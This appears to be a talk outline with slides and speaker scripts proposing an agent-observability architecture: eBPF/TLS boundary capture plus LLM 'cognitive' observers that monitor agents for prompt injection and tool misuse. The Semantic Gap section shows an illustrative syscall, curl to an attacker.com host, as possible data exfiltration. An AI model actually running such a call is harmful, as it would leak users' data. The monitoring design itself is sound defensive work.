
---

**AgentOps Taxonomy (Dong et al., 2024)**

Systematic mapping of agent DevOps tools + artifact taxonomy
- arXiv paper defines observability as "actionable insights into agents' inner workings"
- Identifies gap: Current tools cover LLM metrics/prompts but ignore agent artifacts (goals, plans, tool actions)
- Proposes taxonomy: what to log throughout agent lifecycle (prompt templates, context memory, tool outputs, feedback loops)
- Key insight: AI safety requires built-in observability across entire agent lifecycle
- *Source: [arXiv:2411.05285](https://arxiv.org/abs/2411.05285)*

---

**Watson: Cognitive Observability (Rombaut et al., 2024)**

New paradigm: *cognitive observability* focused on latent reasoning
- Problem: Traditional logs/traces fail for agents—reasoning is opaque
- Solution: Watson retroactively infers reasoning traces from agent behavior
- Method: Uses prompt attribution to reconstruct internal decision chains without modifying agent
- Evaluation: Surfaces actionable reasoning insights from MMLU, software engineering agents
- Key insight: LLM-as-probe can extract hidden chain-of-thought for debugging/transparency
- *Source: [arXiv:2411.03455](https://arxiv.org/abs/2411.03455)*

---

**AgentSight: System-Level Observability (Zheng et al., 2025)**

Hybrid approach: System-level + semantic capture
- Problem: Agent activities (code execution, OS resources) occur outside application—AI logs miss them
- Solution: eBPF (kernel tracing) for low-level events + TLS interception for LLM API traffic
- Correlation: Links prompts/documents → file I/O → process launches in real time
- Evaluation: Detects prompt injections, inefficient reasoning loops, multi-agent coordination bottlenecks
- Key insight: Bridging "inside" (intent) and "outside" (system action) achieves deeper observability
- *Source: [ResearchGate:394322099](https://www.researchgate.net/publication/394322099)*

---

**TRiSM for Agentic AI (Peng et al., 2025)**

Trust, Risk, Security Management framework
- Defines multi-layer architecture with "Monitoring & Governance" layer (ethical oversight, observability, compliance)
- Accountability requirements: Logging, auditing, behavioral traces
- Trust and Audit module: Monitors actions, logs tool usage, generates traces
- Explainability: Systems must provide interpretable rationales for decisions
- Key insight: Observability is integral to trustworthy agent deployments, not optional
- *Source: [arXiv:2506.04133](https://arxiv.org/html/2506.04133v2)*

---

**Common Themes Across Research**

1. **New tools needed:** Traditional software observability insufficient for agents
2. **Extract hidden logic:** Methods to recover agent reasoning beyond standard logs
3. **Lifecycle coverage:** Observability must span planning → execution → feedback
4. **AI-powered analysis:** LLM-as-judge, agent-as-evaluator for scalable insight extraction
5. **System integration:** Hybrid approaches combining app-level + OS-level + model-level capture

**Related Trends:**
- LLM-as-judge evaluation (Arize agent tools): One LLM scores another's trajectories
- Multi-agent interpretability (Kim et al., 2025): Neural probes for agentic systems
- Multi-LLM agent surveys (Guo et al., 2024): Cite observability as open challenge

---

Visual: Timeline diagram showing research evolution 2024-2025 with four key papers (AgentOps, Watson, TRiSM, AgentSight) and their focus areas

Speaker Script (1:15):
"Academic research is beginning to systematically address agent observability, with four key contributions from 2024-2025. First, AgentOps from Dong et al. provides a comprehensive taxonomy defining what artifacts to log throughout the agent lifecycle, including goals, plans, tool outputs, and feedback loops. They demonstrate that current tools focus primarily on LLM metrics but miss core agent artifacts. Second, Watson from Rombaut et al. introduces the concept of cognitive observability, using LLM-powered probes to retroactively infer an agent's hidden reasoning traces without modifying the agent runtime. They demonstrate this approach on MMLU and software engineering benchmarks, successfully surfacing actionable insights. Third, AgentSight from Zheng et al. takes a hybrid approach, combining eBPF for kernel-level events with TLS interception for LLM API traffic, then correlating them in real time. They detect prompt injections, reasoning loops, and multi-agent bottlenecks by bridging the gap between intent and system actions. Fourth, TRiSM from Peng et al. frames observability as essential for trust, defining monitoring and governance layers with logging, auditing, and explainability as core accountability requirements. Common themes emerge across this work. Traditional observability is insufficient for agents. We need new methods to extract hidden agent logic. Hybrid approaches combining system-level and semantic analysis are emerging as the path forward. The academic consensus is clear. Agent observability requires fundamentally new techniques."

#### Slide Deck (Visual)

**Academic Landscape: Recent Research (2024-2025)**

**Three Emerging Themes:**

1. **Traditional Observability is Insufficient**
   → Agents require new methods beyond logs/traces
   *[AgentOps, TRiSM]*

2. **Cognitive & Semantic Analysis**
   → Extract hidden reasoning, infer intent from behavior, LLM-as-judge
   *[Watson, AgentOps]*

3. **Hybrid Multi-Layer Capture**
   → Combine app-level + system-level + model-level signals
   *[AgentSight, Watson]*

**Visual:** Three-column diagram showing themes with inline citations

*Footer: Survey of AgentOps (Dong, 2024), Watson (Rombaut, 2024), AgentSight (Zheng, 2025), TRiSM (Peng, 2025)*

---

### 11) Formal: Two Gaps & Requirements Derivation (0:45)

#### Detail Content (Script)

The Two Fundamental Gaps (from your paper)

---

Gap 1: Instrumentation Gap 🔴
*Problem: Isolating the Causal Signal from High-Volume System Noise*

Technical Challenge:
Agent autonomy leads to unpredictable, high-volume system event streams:
1. Agents use any tool necessary to achieve goals → diverse system calls, file I/O, network traffic
2. High-volume noise: thousands of syscalls per task, most irrelevant to agent decisions
3. Causal signal buried: which events are intentional agent actions vs. background processes?
4. App-layer instrumentation adds coupling: framework-specific (LangChain, AutoGPT, custom)
5. Closed/managed components (Claude Code, Copilot) reject SDK injection entirely

Challenge:
- How to capture sufficient context without overwhelming signal-to-noise ratio?
- How to attribute system events to specific agent decisions amid concurrent processes?
- How to maintain capture across heterogeneous agent architectures?

→ Need stable capture boundaries that survive agent evolution and isolate causal signals

---

Gap 2: Semantic Gap 🟡
*Problem: Boundary telemetry shows WHAT, not WHY*

What Boundary Capture Provides:
- eBPF syscalls: `execve("curl", "https://attacker.com", ...)`
- TLS plaintext: `POST /api/credentials` with payload body
- Model API: Token counts, latency, completion text

What Boundary Capture Misses:
- Intent: Why did the agent choose this tool?
- Reasoning: What was the decision chain leading here?
- Goal alignment: Does this action serve the user's objective?
- Causal linkage: How does this syscall relate to prior model calls?

Example:
```
[Syscall] execve("curl", "https://attacker.com")
         ↑
         ❓ Is this legitimate API integration or data exfiltration?
         ❓ Which agent decision triggered this?
         ❓ What was the goal context?
```

---

Requirements Derived from Production Constraints

Context: Heterogeneity (multi-vendor) + Dynamism (rapid agent evolution) + Scale (1000s of agents)

---

R1: Decouple Capture from App Internals
*Addresses: Instrumentation Gap*

Design Principles:
- Capture at stable system boundaries that survive app changes:
  - Kernel/Syscall layer: Process lifecycle, file I/O (eBPF: Tetragon)
  - Network/TLS layer: Plaintext before encryption (uprobes: eCapture)
  - Model API layer: Request/response at SDK/HTTP boundary (OTel GenAI)
  - Human feedback layer: Structured evaluations and corrections

Invariance Properties:
- ✅ Survives agent code changes
- ✅ Survives framework migrations (LangChain → AutoGPT)
- ✅ Resistant to adversarial tampering (outside agent process)
- ✅ Works with closed/managed components (no code injection needed)

*Evidence: [Tetragon Process Execution](https://tetragon.io/docs/use-cases/process-lifecycle/process-execution/)*

---

R2: Autonomous Semantic Analysis at Scale
*Addresses: Semantic Gap*

Why LLM-Powered Observers:
- Reconstruction: Infer intent from raw events using domain knowledge
- Correlation: Link multi-layer evidence (syscall ← tool call ← reasoning ← goal)
- Adaptation: Handle new agent patterns without manual rule updates
- Scale: Process 1000s of trajectories/hour beyond human capacity

Cognitive Plane Capabilities:
1. Semantic evaluation: Detect hallucinations, loops, tool misuse
2. Trajectory reconstruction: Watson-style surrogate observers
3. Causal reasoning: Build decision → action → cost graphs
4. Policy enforcement: Budget caps, tool deny-lists, quarantine

*Evidence: [Watson arXiv:2411.03455](https://arxiv.org/abs/2411.03455)*

---

R3: Cross-Vendor Schema (Interoperability)
*Addresses: Fragmentation*

Standard: OpenTelemetry GenAI Semantic Conventions

Key Span Types:
- Agent spans: Goal, reasoning steps, tool invocations
- Model spans: Inference operations (tokens, latency, provider)
- Events: Discrete observations (tool calls, retrievals)
- Metrics: Aggregatable measurements (cost, token counts)

Benefits:
- ✅ Portable across backends (Langfuse, Phoenix, Datadog, Honeycomb)
- ✅ Multi-vendor correlation (agent in LangChain + model in OpenAI + tools in MCP)
- ✅ Ecosystem convergence (OpenInference, OpenLLMetry adopt OTel)

*Evidence: [OTel GenAI Agent Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/)*

---

R4: Privacy-Preserving Capture
*Addresses: Compliance & Trust*

Techniques:
1. Redaction at probe: Drop payloads, keep metadata
   - `open("/home/user/secrets.txt")` → `open("/home/user/*")`
2. Sampling: 1-10% full capture, 90-99% metadata-only
3. Scoped retention: 7d full traces, 90d aggregates, ∞ audit logs
4. Policy-driven filtering: Auto-delete PII-tagged spans after N days

Standards Integration:
- OTel attributes: `gen_ai.privacy.level = "masked" | "full" | "none"`
- MCP metadata: Tools declare data sensitivity levels

*Evidence: Privacy-by-design requirements from enterprise deployments*

---

Visual: Gap-to-Requirements Mapping

```
┌─────────────────────────┐
│  Production Challenges  │
└───────────┬─────────────┘
            │
    ┌───────┴───────┐
    │               │
┌───▼──────┐   ┌───▼──────┐
│   Gap 1  │   │   Gap 2  │
│Instrument│   │ Semantic │
└───┬──────┘   └───┬──────┘
    │              │
    ├──► R1: Boundary Capture (Tetragon, eCapture, OTel)
    ├──► R2: Cognitive Plane (Watson-style AI observers)
    │
    ▼
┌───────────────────┐
│  R3: Standards    │ (OTel GenAI spans)
│  R4: Privacy      │ (Redaction, sampling)
└───────────────────┘
```

Sources:
- Your paper (two gaps formalization)
- [Tetragon](https://tetragon.io/) (R1: boundary capture)
- [Watson arXiv](https://arxiv.org/abs/2411.03455) (R2: cognitive observers)
- [OTel GenAI](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/) (R3: standard schema)

Speaker Script (0:45):
"Let me formalize the two fundamental gaps identified in our paper. The Instrumentation Gap concerns isolating causal signals from high-volume system noise. Agent autonomy means agents can use any tool necessary to achieve goals, creating unpredictable, high-volume event streams. Thousands of syscalls per task, most of which are irrelevant to agent decisions. The causal signal is buried among background processes, and app-layer instrumentation creates framework-specific coupling. Closed components like Claude Code and Copilot reject SDK injection entirely. The challenges are: How do we capture sufficient context without overwhelming signal-to-noise ratio? How do we attribute system events to specific agent decisions amid concurrent processes? How do we maintain capture across heterogeneous agent architectures? The Semantic Gap concerns the fact that boundary telemetry, including syscalls, TLS, and network traffic, shows what happened but not why. Raw events lack causal linkage between agent decisions, system actions, and outcomes. For example, we might observe an execve of curl to attacker-dot-com, but not understand why the agent chose this action. From these gaps, we derive four requirements. R1: Decouple capture from app internals by capturing at stable system boundaries including kernel syscalls, network TLS, model API, and human feedback, remaining invariant to code changes, framework switches, and architecture evolution. R2: Autonomous semantic analysis at scale, where only LLM-powered observers in the Cognitive Plane can close the semantic gap by reconstructing decisions, correlating layers, adapting to new patterns, and scaling beyond manual analysis. R3: Cross-vendor schema adoption through OTel GenAI agent spans for portable telemetry, enabling multi-vendor stacks to exchange and correlate observations. R4: Privacy-preserving capture through redaction and masking at probe time, dropping payloads while keeping metadata, with sampling, scoped retention, and policy-driven filtering."

#### Slide Deck (Visual)

**Two Gaps & Requirements**

**Gap 1: Instrumentation Gap**
• Causal signal lost in high-volume syscall noise
• App-layer SDKs brittle, closed components inaccessible

**Gap 2: Semantic Gap**
• Boundary telemetry shows WHAT, not WHY (no intent/reasoning)

**Four Requirements:**
• **R1:** Boundary-based capture (kernel, TLS, API)
• **R2:** AI-powered semantic analysis (Cognitive Plane)
• **R3:** Standard spans (OTel GenAI)
• **R4:** Privacy-preserving (redaction, sampling)

**Visual:** Production Challenges → Two Gaps → Four Requirements

*Footer: ¹Tetragon, ²Watson arXiv, ³OTel GenAI*

---

### 12) Formal Definition: Agent Observability (0:45)

#### Detail Content (Script)

Formal System Model

An agentic system is a tuple ⟨G, Π, T, E⟩ where:
- G: Goals (user intent, objectives)
- Π: Plans/Trajectories (reasoning steps, decision sequences)
- T: Tools (external capabilities the agent can invoke)
- E: Environment Events (system actions, API calls, observations)

---

Definition: Agent Observability

Agent observability is the capability to:

(a) Capture:
- A minimal, sufficient statistic S(E) of environment events
- At stable system boundaries: model API / network (TLS) / syscalls / human feedback
- With properties: tamper-resistant, low overhead, privacy-preserving

(b) Infer:
- From the tuple ⟨S(E), G, Π, T⟩
- Whether the agent's reasoning and actions satisfy:
  - Correctness: Goal alignment, tool justification
  - Safety: Policy compliance, attack resistance
  - Cost: Budget constraints, efficiency
- With auditability: Traceable decision chains for compliance

---

Paradigm Shift from Traditional Observability

| Dimension | Traditional (Systems) | Agentic (Behavioral) |
|-----------|----------------------|---------------------|
| Primary Goal | System health & availability | Behavioral correctness, safety, trust |
| Pillars | MELT (Metrics, Events, Logs, Traces) | MELT + Evaluations + Governance |
| Unit of Analysis | Request trace (HTTP → service → DB) | Decision trajectory (goal → reasoning → tool → action → outcome) |
| Failure Modes | Exceptions (5xx, timeouts, crashes) | Quiet failures (logic errors, tool misuse, hallucinations, IPI) |
| Correlation | Distributed tracing (span hierarchy) | Causal reasoning (intent → action → system effect → cost) |
| Response | Alert → page ops team | Policy enforcement (quarantine, budget cap, tool deny-list) |

---

Formal Problem Decomposition (Three Pain Points)

1. Safety
   - Challenge: Uncertainty + complexity → semantic failures + adversarial threats
   - Examples: IPI, tool misuse, credential leakage
   - Requirement: Audit-quality trajectory traces with boundary-aligned capture

2. Cost
   - Challenge: Multi-layer, non-linear cost growth
   - Examples: Multi-agent token escalation (7.5×), infrastructure overhead (70% of API)
   - Requirement: $/task & tokens/solve SLIs, budget policies, cost attribution

3. Fragmentation
   - Challenge: Multi-vendor, multi-layer stacks with mixed ownership
   - Examples: SaaS models, managed agents (Claude Code), MCP tools
   - Requirement: Standard telemetry (OTel GenAI), boundary capture, cross-vendor correlation

---

Visual:

| Dimension | Traditional | → | Agentic |
|--------------|----------------|-------|-------------|
| Goal | System health | → | Behavioral correctness |
| Pillars | MELT | → | MELT + Evals + Gov |
| Unit | Request trace | → | Decision trajectory |
| Failures | Exceptions | → | Quiet failures |

*Sources:*
- Your paper (two-plane vision, gaps, requirements)
- [InjecAgent ACL 2024](https://aclanthology.org/2024.findings-acl.624/) (IPI threat model)
- [S²-MAD NAACL 2025](https://aclanthology.org/2025.naacl-long.475.pdf) (cost escalation)

Speaker Script (0:45):
"Having identified the gaps across the landscape, let me now formalize what Agent Observability means. An agentic system can be represented as a tuple consisting of Goals, Plans, Tools, and Environment events. Agent observability is the capability to, first, capture a minimal, tamper-resistant statistic at stable system boundaries, including model endpoints, network, syscalls, and human feedback, and second, infer from these signals whether the agent's reasoning and actions satisfy correctness, safety, and cost constraints, with full auditability. This represents a fundamental shift: from system health to behavioral correctness, from MELT to MELT plus Evaluations plus Governance, and from request traces to decision trajectories. The formal problem has three dimensions: safety under uncertainty, cost escalation, and fragmentation across vendors."

#### Slide Deck (Visual)

**Formal Definition: Agent Observability**

**System Model:** Agentic system = ⟨Goals, Plans, Tools, Environment Events⟩

**Agent Observability Capability:**
• **Capture:** Minimal statistic S(E) at stable boundaries (model API, TLS, syscalls, human feedback)
• **Infer:** Whether reasoning/actions satisfy correctness, safety, cost constraints with auditability

**Paradigm Shift:**
• Traditional: System health, MELT, request traces, exceptions
• Agentic: Behavioral correctness, MELT + Evals + Governance, decision trajectories, quiet failures

**Three Problem Dimensions:**
• Safety: Uncertainty → semantic failures (IPI, tool misuse)
• Cost: Multi-layer, non-linear growth (7.5× tokens, 70% infra)
• Fragmentation: Multi-vendor stacks (SaaS, managed agents, MCP)

**Visual:** Comparison table (Traditional vs Agentic observability)

*Footer: ¹InjecAgent ACL 2024, ²S²-MAD NAACL 2025*

---

## Vision (3 slides) — from paper

### 13) Vision: Two-Plane Architecture (Overview) (1:00)

#### Detail Content (Script)

Data Plane:
- Capture cross-layer events at stable boundaries (model/network/TLS, system/process, human feedback)
- No in-app SDK required, suitable for closed-source/managed components
- Unify mapping to OTel GenAI agent/model spans
- Privacy-first: Redaction at probe time, sampling (1-10% full, 90-99% metadata), scoped retention
- *Source: [OTel GenAI](https://opentelemetry.io/docs/specs/semconv/gen-ai/)*

Cognitive Plane:
- Agents observe agents: semantic evals, trajectory reconstruction, cross-layer causality/cost correlation, policy & budget actions
- Scales beyond manual analysis

Why together:
- Data plane provides usable signals
- Cognitive plane provides interpretation & governance
- Together form safety/cost/control closed loop

Key Metrics:
- Security: Attack capture rate, Mean Time To Acknowledge (MTTA), trajectory completeness
- Cost: $/successful task, tokens/solve, runaway-loop prevention
- Reliability: Agent incident Mean Time To Resolve (MTTR), tool-success ratio, quiet failure detection
- Standards: OTel GenAI conformance, MCP tool coverage, cross-vendor correlation

Speaker Script (1:00):
"Our Two-Plane Architecture embodies emerging best practices from the field: multi-layer observability and AI-driven introspection. The Data Plane captures telemetry at stable system boundaries, including model endpoints, TLS traffic, system calls, and human feedback, without modifying application code. It maps these events into OTel GenAI agent and model spans for vendor-neutral exchange, demonstrating multi-layer observability in action. The Cognitive Plane leverages the concept that agents can observe agents. Surrogate AI observers perform semantic evaluations, reconstruct decision trajectories, reason about causes and costs across layers, and take policy actions including quarantine, budget caps, and alerts. This represents AI-driven introspection, leveraging cognitive observability concepts from recent research. Together, these two planes deliver a closed loop for safety, cost, and control. The Data Plane provides usable signals, while the Cognitive Plane provides interpretation and governance. This architecture aligns with where both industry and research are heading."

#### Slide Deck (Visual)

**Vision: Two-Plane Architecture**

**Embodies Emerging Best Practices:** Multi-layer observability + AI-driven introspection

**Data Plane:** (Multi-layer observability)
• Capture at stable boundaries (model, TLS, syscalls, human feedback)
• No in-app SDK required
• Map to OTel GenAI spans
• Privacy-first: Redaction, sampling, scoped retention

**Cognitive Plane:** (AI-driven introspection)
• Agents observe agents (cognitive observability)
• Semantic evals, trajectory reconstruction, cross-layer causality
• Policy actions: Quarantine, budget caps, alerts

**Together:** Safety, cost, and control closed loop

**Key Metrics:**
• Security: Attack capture rate, MTTA, trajectory completeness
• Cost: $/successful task, tokens/solve, runaway prevention
• Reliability: MTTR, tool-success ratio, quiet failure detection
• Standards: OTel conformance, MCP coverage

**Visual:** Two-plane architecture diagram with data flow

*Footer: ¹OTel GenAI*

---

### 14) Vision: Data Plane (Evidence & Practice) (1:00)

#### Detail Content (Script)

System layer:
- Process/file/subprocess captured by Tetragon (eBPF tool)
- Captures: execve, lifecycle, file monitoring
- K8s/container metadata correlation
- *Source: [Tetragon Process Execution](https://tetragon.io/docs/use-cases/process-lifecycle/process-execution/)*

Network/TLS layer:
- Userspace library boundaries: uprobes (e.g., eCapture)
- Capture TLS plaintext
- Compatible with closed-source/managed clients & IDE integrations (no upstream code changes)
- *Source: [eCapture GitHub](https://github.com/gojue/ecapture)*

Model layer:
- OTel GenAI records inference operations (tokens, latency, provider attrs)
- Compatible with Langfuse/Phoenix/Datadog/Honeycomb backends
- *Source: [OTel GenAI Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-spans/)*

Human layer:
- Structured human feedback as ground truth
- Evaluation data feeds cognitive plane

Deployment Path (90 Days):
- P0 (Weeks 1-2): Boundary tracing (eBPF syscalls, TLS metadata, minimal model I/O spans)
- P1 (Weeks 3-4): Adopt OTel GenAI agent spans, bridge with OpenInference/OpenLLMetry
- P2 (Weeks 5-8): Deploy cognitive observability agents (Watson-style)
- P3 (Weeks 9-12): Multi-agent causal graphs, compliance/audit pipelines, MCP-aware capture

Speaker Script (1:00):
"Evidence demonstrates that this approach works today. At the system layer, Tetragon, an eBPF-based tool, observes process lifecycle including execve, file I/O, and subprocess spawning, with correlation to Kubernetes and container metadata. At the network and TLS layer, eCapture demonstrates TLS plaintext capture at the library boundary for OpenSSL and GnuTLS using uprobes, without requiring any changes to application code. This approach is compatible with closed-source and managed clients, as well as IDE integrations. At the model layer, OTel GenAI records inference operations including tokens, latency, and provider attributes. These spans flow into backends like Langfuse, Phoenix, Datadog, and Honeycomb. At the human layer, structured human feedback serves as ground truth for evaluation, feeding directly into the Cognitive Plane."

#### Slide Deck (Visual)

**Vision: Data Plane (Evidence & Practice)**

**System Layer:**
• Tetragon (eBPF): Process lifecycle, execve, file I/O, K8s correlation

**Network/TLS Layer:**
• eCapture (uprobes): TLS plaintext at library boundary (OpenSSL, GnuTLS)
• Compatible with closed-source/managed clients

**Model Layer:**
• OTel GenAI: Inference operations (tokens, latency, provider)
• Flows to Langfuse, Phoenix, Datadog, Honeycomb

**Human Layer:**
• Structured feedback as ground truth

**Deployment Path (90 Days):**
• P0 (Weeks 1-2): Boundary tracing (eBPF, TLS, model I/O)
• P1 (Weeks 3-4): OTel GenAI spans, OpenInference/OpenLLMetry
• P2 (Weeks 5-8): Cognitive agents (Watson-style)
• P3 (Weeks 9-12): Causal graphs, compliance, MCP capture

*Footer: ¹Tetragon, ²eCapture, ³OTel GenAI*

---

### 15) Vision: Cognitive Plane (Algorithms & Outputs) (1:00)

#### Detail Content (Script)

Algorithms:
- Semantic evaluation: hallucination/loop/tool-misuse detection
- Decision trajectory reconstruction (ref: Watson)
- Multi-layer evidence causality graph
- Cost policies: $/task, tokens/solve
- *Source: [Watson arXiv](https://arxiv.org/abs/2411.03455)*

Outputs:
- ① Security alerts & isolation (policy enforcement)
- ② Cost budgets & rate limiting (fallback policies/shutdown conditions)
- ③ Auditable multi-agent causal chains & summaries

Privacy & Compliance Integration:
- Redaction/Masking: Drop payloads, keep metadata (e.g., `open("/home/user/*")`)
- Sampling: 1-10% full capture, 90-99% metadata-only
- Scoped retention: 7d full traces, 90d aggregates, ∞ audit logs
- Policy-driven filtering: Auto-delete PII-tagged spans after N days
- Standards: OTel `gen_ai.privacy.level` attributes, MCP policy metadata
- Consent & transparency: User notification, audit logs for compliance

Speaker Script (1:00):
"The Cognitive Plane executes algorithms for semantic evaluation, including detecting hallucinations, infinite loops, and tool misuse. Decision trajectory reconstruction, inspired by the Watson framework, employs surrogate observers to reconstruct agent reasoning without modifying the target agent runtime. It constructs multi-layer causal graphs that link agent decisions to model token costs to system actions to final outcomes. Cost policies enforce dollar-per-task limits and tokens-per-solve thresholds. The system produces three categories of outputs. First, security alerts and isolation through policy enforcement, quarantine mechanisms, and tool deny-lists. Second, cost budgets and rate limiting through fallback policies, stop conditions, and routing to more cost-effective agents. Third, auditable multi-agent causal chains, providing structured summaries for regulatory review and incident post-mortems."

#### Slide Deck (Visual)

**Vision: Cognitive Plane (Algorithms & Outputs)**

**Algorithms:**
• Semantic evaluation: Hallucination, loop, tool-misuse detection
• Decision trajectory reconstruction (Watson-style surrogate observers)
• Multi-layer causality graph (decisions → costs → actions → outcomes)
• Cost policies: $/task, tokens/solve thresholds

**Outputs:**
• **Security:** Alerts, isolation, policy enforcement, quarantine
• **Cost:** Budgets, rate limiting, fallback policies, routing to cheaper agents
• **Auditability:** Multi-agent causal chains, structured summaries

**Privacy & Compliance:**
• Redaction/masking, sampling (1-10% full / 90-99% metadata)
• Scoped retention: 7d full / 90d aggregates / ∞ audit logs
• OTel privacy attributes, MCP policy metadata
• Consent & transparency for compliance

**Visual:** Flow diagram showing algorithms → outputs → governance actions

*Footer: ¹Watson arXiv*
